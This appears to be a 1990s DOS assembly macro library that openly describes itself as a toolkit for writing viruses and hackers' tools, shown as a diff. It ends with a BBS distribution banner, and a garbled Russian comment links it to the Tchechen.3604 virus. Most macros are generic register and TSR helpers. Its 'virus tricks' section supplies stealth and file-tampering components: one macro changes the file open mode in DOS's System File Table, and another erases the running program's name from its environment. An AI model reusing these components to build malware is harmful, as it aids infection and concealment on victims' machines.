@@ -1,0 +1,174 @@
+;ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ
+;Û                                                                Û
+;Û  MACRO LIBRARY FOR VIRUSES, THEIR DEBUGGING AND HACKERS' TOOLS Û
+;Û                                                                Û
+;Û  VIRMACRO, v13.12.95                                           Û
+;ÛÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÛ
+
+
+; â  ¡¨¡«¨®â¥ª  ¬ ªà®á®¢ á®¤¥à¦¨â ­¥®¡å®¤¨¬ë¥ ¢¨àãáã Tchechen.3604 ¨
+; ¬­®£® ¤àã£¨å ¯®«¥§­ëå ¬ ªà®á®¢.
+
+;ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ
+;Û ASM INSTRUCTIONS SUBSTITUTES Û
+;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
+;----------------------------
+;MOVA %2,%1     Moves thru AX
+;PUSHALL	All regs
+;POPALL         All regs
+;SDS  %2,%1     Inversion of LDS
+;SES  %2,%1     Inversion of LES
+;SCS  %2,%1     Inversion of LCS
+;SMOV %2,%1	PUSH (%1) / POP (%2).  %* = "FS" for flags
+;CLT		Clear TF
+;STT		Set   TF
+;XXCHG %2,%1    XCHG thru stack 
+
+;ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ
+;Û VIRUS TRICKS Û
+;ßßßßßßßßßßßßßßßß
+;------------
+;CHANGEOPENMODE	 Changes File Open Mode to 02 in SFT
+;KILLNAME        Drops 00 to the beginning of px_name in Envir.Seg
+
+
+;ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ
+;Û DEBUGGING MACROS Û
+;ßßßßßßßßßßßßßßßßßßßß
+;----------------
+;BEEP %1         INT_10, f0E
+
+;ÜÜÜÜÜÜÜÜÜÜÜÜÜ
+;Û CONSTANTS Û
+;ßßßßßßßßßßßßß
+;---------
+;POPALLSTACK
+
+;ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ
+;Û USUAL PROGRAMMERS' MACROS Û
+;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
+;-------------------------
+;TSR_UP %1,%2    Sets up Int_%1 with %2 length TSR
+
+;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
+BEEP MACRO beeper
+	push ax
+	pushf
+	mov ah,0eh
+	mov al,BEEPER
+	int 10h
+	popf
+	pop ax
+ENDM
+OUTCHAR MACRO beeper
+	BEEP beeper
+ENDM
+
+SMOV MACRO dst,src
+	IFIDN <SRC>,<&FS>
+	      PUSHF
+	ELSE
+              PUSH SRC
+	ENDIF
+	IFIDN <DST>,<&FS>
+	      POPF
+	ELSE
+	      POP  DST
+	ENDIF
+ENDM
+SES MACRO dst,src
+	MOV DST,SRC
+	MOV DST&[+2],ES
+ENDM
+SDS MACRO dst,src
+	MOV DST,SRC
+	MOV DST&[+2],DS
+ENDM
+SCS MACRO dst,src
+	MOV DST,SRC
+	MOV DST&[+2],CS
+ENDM
+CLT MACRO
+	PUSH AX
+	SMOV AX,FS
+	AND  AH,0FEH
+	SMOV FS,AX
+	POP  AX
+ENDM
+STT MACRO
+	PUSH AX
+	SMOV AX,FS
+	OR   AH,01
+	SMOV FS,AX
+	POP  AX
+ENDM
+MOVA MACRO dst,src
+	MOV AX,src
+	MOV dst,AX
+ENDM
+PUSHALL MACRO
+	PUSH AX CX DX BX BP SI DI DS ES
+ENDM
+POPALL MACRO
+	POP ES DS DI SI BP BX DX CX AX
+ENDM
+
+POPALLSTACK EQU 18
+
+XXCHG MACRO OP1,OP2
+	PUSH OP1
+	PUSH OP2
+	POP  OP1
+	POP  OP2
+	ENDM
+
+CHANGEOPENMODE MACRO                    ; CHANGES FILE OPEN MODE
+	PUSH BX ES DI
+	MOV  AX,1220H
+	PUSH AX
+	INT  2FH
+	MOV  BL,ES:[DI]
+	POP  AX
+	SUB  AL,0AH
+	INT  2FH
+	MOV  WORD PTR ES:[DI][0002],0002
+        POP  DI ES BX
+        ENDM
+
+TSR_UP MACRO TSRINT,ENDTSR
+	MOV AX,35&TSRINT
+	INT 21H
+	MOV WORD PTR OLD&TSRINT,BX
+	MOV WORD PTR OLD&TSRINT+2,ES
+	MOV DX,OFFSET HANDLER&TSRINT
+	MOV AX,25&TSRINT
+	INT 21H
+
+	MOV DX,OFFSET ENDTSR
+	INT 27H
+	ENDM
+
+KILLNAME MACRO
+	LOCAL MM
+	PUSH AX CX DI ES
+	MOV AX,DS:[002CH]
+	MOV ES,AX
+	XOR DI,DI
+	CLD
+	MOV CX,1000H
+	XOR AL,AL
+    MM: REPNE SCASB
+	SCASB
+	JNZ MM
+	ADD DI,2
+	STOSB
+	POP ES DI CX AX
+	ENDM
+;---------------------------------- CONSTANTS --------------------------
+PSP_MEMTOP EQU 4
+OWNER_PARA EQU 1
+PSP_22     EQU 0AH
+; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
+; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ Remember Where You Saw This Phile First ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
+; ÄÄÄÄÄÄÄ[=] ARRESTED DEVELOPMENT +31.77.3547477 The Netherlands [=]ÄÄÄÄÄÄÄ
+; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
